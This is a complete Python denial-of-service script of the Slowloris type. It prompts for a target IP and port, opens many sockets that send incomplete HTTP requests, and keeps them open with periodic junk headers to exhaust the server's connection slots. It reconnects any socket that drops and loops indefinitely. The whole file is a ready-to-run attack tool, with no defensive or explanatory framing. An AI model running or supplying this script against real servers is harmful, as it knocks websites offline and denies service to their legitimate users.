import os
import sys
import random
import socket
import time
import argparse

regular_headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/41.0",
            "Accept-language: en-US,en,q=0.5"]

def init_socket(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((host, port))
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
    for header in regular_headers:
        s.send('{}\r\n'.format(header).encode('UTF-8'))
    return s


def main():
    target_ip = input("Target IP: ")
    target_port = int(input("Target Port: "))
    max_sockets = int(input("Max sockets: "))
    reconnection_time = int(input("Reconnection Time (seconds) : "))
    print("creating "+str(max_sockets)+" connections...")

    socket_list=[]
    for _ in range(max_sockets):
        try:
            s = init_socket(target_ip, target_port)
        except socket.error:
            break
        socket_list.append(s)

    print(str(len(socket_list))+"  socket connections created.")

    while True:
        print("sending 'Keep-Alive' headers to "+str(len(socket_list))+" connections")
        # send keep-alive headers to open connections
        for s in socket_list:
            try:
                # send custom header with some random bytes
                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
            except socket.error:
                socket_list.remove(s)

        # reconnect disconnected sockets
        if max_sockets - len(socket_list):
            print('creating'+ str(max_sockets - len(socket_list))+ 'new socket connections')
            num_new_connections = 0
            for _ in range(max_sockets - len(socket_list)):
                try:
                    s=init_socket(target_ip, target_port)
                    if s:
                        socket_list.append(s)
                        num_new_connections += 1
                except socket.error:
                    break
            print(str(num_new_connections)+" socket connections created")
        print('sleeping'+str(reconnection_time)+' seconds...')
        time.sleep(reconnection_time)

if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        print('exiting.')
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
            